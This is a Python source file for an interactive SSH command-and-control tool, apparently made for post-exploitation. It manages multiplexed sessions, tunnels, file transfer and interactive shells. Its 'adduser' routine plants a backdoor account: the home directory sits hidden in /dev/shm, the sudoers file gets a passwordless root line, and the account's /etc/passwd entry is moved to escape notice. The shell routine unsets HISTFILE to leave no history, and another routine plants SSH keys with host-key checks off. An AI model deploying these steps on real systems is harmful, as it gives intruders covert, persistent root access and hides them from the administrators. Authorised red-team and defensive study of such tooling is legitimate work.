#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ssh_config
from ssh_config import SSHConfig, Host
from prettytable import PrettyTable
import subprocess
import argparse
import logging
import random
import string
import shlex
import glob
import sys
import os

from siranga import ACTIVE_CONNECTION, ACTIVE_CONNECTIONS, HOSTS
from siranga.prompt import Prompt
from siranga.config import *
from siranga.helpers import *

logger = logging.getLogger(__name__)

def connect_host(host):
    '''
    Connect to the server
    Usage:
        !connect <host>
    '''

    global ACTIVE_CONNECTIONS
    global ACTIVE_CONNECTION

    if not host or len(host.split()) != 1:
        logger.error(connect_host.__doc__)
        return

    # lookup host infos
    identity = host_lookup(host)
    if not identity:
        logger.error('Invalid Host')
        return

    # Create SSH connection
    if not socket_create(identity):
        return

    ACTIVE_CONNECTION = identity
    ACTIVE_CONNECTIONS.append(identity)


def disconnect_host():
    '''
    Disconnect from server
    Usage:
        !disconnect
    '''

    global ACTIVE_CONNECTION
    ACTIVE_CONNECTION = None


def kill_host(host):
    '''
    Kill the ssh session
    Usage:
        !kill <host>
    '''
    global ACTIVE_CONNECTIONS

    if not host or len(host.split()) != 1:
        logger.error(kill_host.__doc__)
        return

    # lookup host infos
    identity = host_lookup(host)
    if not identity:
        logger.error('Invalid Host')
        return

    if not socket_cmd(identity, 'check'):
        logger.error('No active connection')
        return

    socket_cmd(identity, 'exit')
    SOCKET_PATH = f'{OUTPUT_PATH}/{identity.HostName}/control_%r@%h:%p'
    if os.path.exists(f'{SOCKET_PATH}'):
        logger.error('Problem killing connection')
        return

    for i, ident in enumerate(ACTIVE_CONNECTIONS):
        if host == ident.name:
            del ACTIVE_CONNECTIONS[i]
            break


def port_forward(cmd, opts):
    '''
    Open ports for tunneling
    Usage:
        !-D <port> - setup socks proxy
        !-L <port>:<host>:<port> - local port forward
        !-R <port>:<host>:<port> - Open reverse tunnel
        !-K -[R|L|D]<port>:<host>:<port> - stop forwarding
    '''
    if not opts or len(opts.split()) != 1:
        logger.error(port_forward.__doc__)
        return

    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
        logger.error('No active connection')
        return

    if cmd == '-K':
        socket_cmd(ACTIVE_CONNECTION, 'cancel', opts)
    else:
        socket_cmd(ACTIVE_CONNECTION, 'forward', f'{cmd} {opts}')


def transfer_file(direction, args):
    '''
    Recursively transfer file/folder
    Usage:
        !get <remote_path>
        !put <local_path> <remote_path>
    '''
    if not args or not direction:
        logger.info(transfer_file.__doc__)
        return

    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
        logger.error('No active connection')
        return

    # specify full paths -- less work ;)
    paths = args.split()
    for path in paths:
        if not path.startswith('/'):
            logger.error('Must specify full path')
            return

    SOCKET_PATH = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.HostName}/control_%r@%h:%p'

    if direction == 'get':
        if len(paths) != 1:
            logger.info(transfer_file.__doc__)
            return

        path = paths[0]

        local_path = f'{OUTPUT_PATH}/downloads/{ACTIVE_CONNECTION.HostName}{path}'
        if not os.path.exists(local_path):
           os.makedirs(local_path)

        logger.info(f'Downloading to {local_path}')
        command = f'scp -rp -o ControlPath={SOCKET_PATH} {ACTIVE_CONNECTION.name}:{path} {local_path}'

    elif direction == 'put':
        if len(paths) != 2:
            logger.info(transfer_file.__doc__)
            return

        from_path, to_path = paths

        logger.info(f'FROM {from_path} TO {to_path}')
        command = f'scp -rp -o ControlPath={SOCKET_PATH} {from_path} {ACTIVE_CONNECTION.name}:{to_path}'

    try:
        logger.debug(command)
        subprocess.call(command, shell=True)
    except Exception as e:
        logger.error(str(e))


def interactive_shell():
    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
        logger.error('No active connection')
        return

    # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
    # Get rows and columns
    orig_tty = subprocess.check_output(shlex.split('stty -g'))
    tty_val = subprocess.check_output(shlex.split('stty -a')).split(b';')
    rows = int(tty_val[1].split()[-1])
    columns = int(tty_val[2].split()[-1])

    SOCKET_PATH = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.HostName}/control_%r@%h:%p'
    command = f"stty raw -echo; (echo unset HISTFILE; echo export TERM={os.environ['TERM']}; echo stty rows {rows} columns {columns}; echo reset; cat) | ssh {SSH_OPTS} -S {SOCKET_PATH} {ACTIVE_CONNECTION.name} "
    # Pre-checks
    # python ?
    if execute('python -V', ACTIVE_CONNECTION).find(b'non-zero exit status') == -1:
        command += '"python -c \'import pty;pty.spawn(\\\"/bin/bash\\\");exit()\'"'

    # python3 ?
    elif execute('python3 -V', ACTIVE_CONNECTION).find(b'non-zero exit status') == -1:
        command += '"python3 -c \'import pty;pty.spawn(\\\"/bin/bash\\\");exit()\'"'

    else:
        # now wut?
        logger.error('TBD')
        return

    logger.debug(command)
    subprocess.call(command, shell=True)

    subprocess.call(shlex.split(f'stty {orig_tty.decode()}'))


def get_active_host():
    '''
    Check the active connects
    '''
    global ACTIVE_CONNECTIONS

    active = []
    table = PrettyTable()
    table.field_names = field_names
    table.border = False
    table.align = 'l'

    CONTROL_FILES = f'{OUTPUT_PATH}/**/control_*'
    for control_file in glob.glob(CONTROL_FILES):
        ip = control_file.split('/')[-2]
        user = control_file.split('/')[-1].split('_')[-1].split('@')[0]
        host = hostname_lookup(ip, user)
        if host is None:
            continue
        table.add_row([host.name, host.HostName, host.User, host.Port, host.IdentityFile, host.ProxyJump])
        active.append(host)
    ACTIVE_CONNECTIONS = active
    logger.info(table)


def set_host(args):
    '''
    Add/Modify ssh_config entry
    Usage:
        Update Field:
            !set <host> <field_name> <value>
        Add Entry:
            !set <host> <hostname> <user> <port>
    '''
    global HOSTS
    try:
        config = SSHConfig.load(SSH_CONFIG_PATH)
    except ssh_config.client.EmptySSHConfig:
        config = SSHConfig(SSH_CONFIG_PATH)

    # print out current hosts
    if not args:
        table = PrettyTable()
        table.field_names = field_names
        table.border = False
        table.align = 'l'

        for host in config:
            table.add_row([host.name, host.HostName, host.User, host.Port, host.IdentityFile, host.ProxyJump])
        logger.info(table)
        return

    current_hosts = [host.name for host in config]

    args = list(map(lambda x: x.strip(), args.split()))
    # update entry
    if args[0] in current_hosts and len(args) == 3:
        if args[1] not in field_names:
            logger.error('Use Designated Field Names')
            logger.error(set_host.__doc__)
            return

        if args[2].lower() == 'none':
            args[2] = None

        config.update(args[0], {args[1]: args[2]})
    # add entry
    elif args[0] not in current_hosts and len(args) == 4:
        new_host = Host(args[0], {
                'HostName': args[1],
                'User': args[2],
                'Port': args[3]
            })
        config.append(new_host)
    # invalid
    else:
        logger.error(set_host.__doc__)
        return

    config.write()
    load_config()

def remove_host(host):
    '''
    Remove entry from SSH config
    Usage:
        !remove <host>

    '''
    if not host or len(host.split()) != 1:
        logger.error(remove_host.__doc__)
        return

    # lookup host infos
    identity = host_lookup(host)
    if not identity:
        logger.error('Invalid Host')
        return

    try:
        config = SSHConfig.load(SSH_CONFIG_PATH)
    except ssh_config.client.EmptySSHConfig:
        return # nothing to remove

    config.remove(host)
    config.write()


def create_user(user):
    '''
    Create a new user to login with keys
    Usage:
        !adduser <username>
    '''
    if not user or len(user.split()) != 1:
        logger.error(create_user.__doc__)
        return

    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
        logger.error('No active connection')
        return

    # Check if user has perms
    if ACTIVE_CONNECTION.User != 'root':
        if execute('sudo -v', ACTIVE_CONNECTION).find(b'non-zero exit status') == -1:
            logger.error(f'sudo command does not exist')
            return

    # Generate password
    passwd = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(32)])
    logger.info(f'Creating user {user} with passowrd {passwd}')

    # Create User
    # Add to sudoers
    # Create SSH dir
    # Copy over keys
    homedir = f'/dev/shm/.{user}'
    commands = [
        f'useradd -lmr -d {homedir} -s /bin/sh {user}',
        f'yes {passwd} | passwd {user}',
        f'echo -n \'{user} ALL=(ALL) NOPASSWD:ALL\' >> /etc/sudoers',
        f'mkdir -p {homedir}/.ssh && chmod 700 {homedir}/.ssh'
    ]
    try:
        for command in commands:
            logging.debug(command)
            execute(command, ACTIVE_CONNECTION)
    except Exception as e:
        logger.error(str(e))
        return

    # Move user in /etc/password so it's not at the bottom
    logger.info('Moving user in /etc/passwd. Getting line number')

    get_line_num = f"cat /etc/passwd | sed -nr '/^{user}/=;' | tr -d '\n'"
    logger.debug(get_line_num)
    line_num = int(execute(get_line_num, ACTIVE_CONNECTION).decode())

    new_line_num = line_num - random.randint(8, 15)
    logger.info(f'Moving to line: {new_line_num}')

    move_line = f"printf '%s\\n' '{line_num}m{new_line_num}' 'wq' | ex -s /etc/passwd"
    logger.debug(move_line)
    execute(move_line, ACTIVE_CONNECTION)


def add_keys():
    '''
    Generate SSH Keys and upload them
    '''

    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
        logger.error('No active connection')
        return

    LOCAL_SSH_DIR = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.name}'
    if not path.exists(LOCAL_SSH_DIR):
        os.makedirs(LOCAL_SSH_DIR)

    # Generate keys if we don't have them
    if not ACTIVE_CONNECTION.IdentityFile:
        try:
            priv_key = f'{LOCAL_SSH_DIR}/{ACTIVE_CONNECTION.User}'
            command = f'ssh-keygen -q -t ed25519 -f {priv_key} -b 4096 -N ""'
            logger.debug(command)
            subprocess.call(command, shell=True)
        except Exception as e:
            logger.error(str(e))
            return
        set_host(f'{ACTIVE_CONNECTION.name} IdentityFile {priv_key}')
    else:
        priv_key = ACTIVE_CONNECTION.IdentityFile

    # Add key to authorized_keys
    try:
        SOCKET_PATH = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.HostName}/control_%r@%h:%p'
        command = f'ssh-copy-id -i {priv_key} -o ControlPath={SOCKET_PATH} -o StrictHostKeyChecking=no {ACTIVE_CONNECTION.User}@{ACTIVE_CONNECTION.name}'
        logger.debug(command)
        subprocess.call(command, shell=True)
    except Exception as e:
        logger.error(str(e))
        return

def main():
    global ACTIVE_CONNECTIONS
    global HOSTS

    load_config()

    CONTROL_FILES = f'{OUTPUT_PATH}/**/control_*'
    for conn in [host_lookup(x.split('/')[-2]) for x in glob.glob(CONTROL_FILES)]:
        ACTIVE_CONNECTIONS.append(conn)

    prompt = Prompt()

    while True:
        try:
            command = prompt.show()
            if not command.startswith('!'):
                if ACTIVE_CONNECTION:
                    if not command:
                        continue

                    execute(command, ACTIVE_CONNECTION)
                else:
                    valid_cmds = '\n\t'.join(prompt.completer.options.keys())
                    logger.error(f'Valid commands are: {chr(10)}{chr(9)}{valid_cmds}')
                    continue
            else:
                command = command[1:].split()
                if len(command) > 1:
                    command, args = command[0], ' '.join(command[1:])
                else:
                    command, args = command[0], ''

                # handle special commands
                if ACTIVE_CONNECTION:
                    if command == 'disconnect':
                        disconnect_host()
                    elif command == 'shell':
                        interactive_shell()
                    elif command in ['-D', '-K', '-L', '-R']:
                        port_forward(command, args)
                    elif command in ['get', 'put']:
                        transfer_file(command, args)
                    elif command == 'adduser':
                        create_user(args)
                    elif command == 'addkey':
                        add_keys()
                else:
                    if command in ['exit', 'quit']:
                        sys.exit(0)
                    elif command == 'connect':
                        connect_host(args)
                    elif command == 'remove':
                        remove_host(args)
                    elif command == 'active':
                        get_active_host()
                    elif command == 'kill':
                        kill_host(args)
                    elif command == 'set':
                        set_host(args)


        except (KeyboardInterrupt, EOFError) as e:
            pass
        finally:
                prompt.prompt = ACTIVE_CONNECTION


if __name__ == '__main__':
    main()
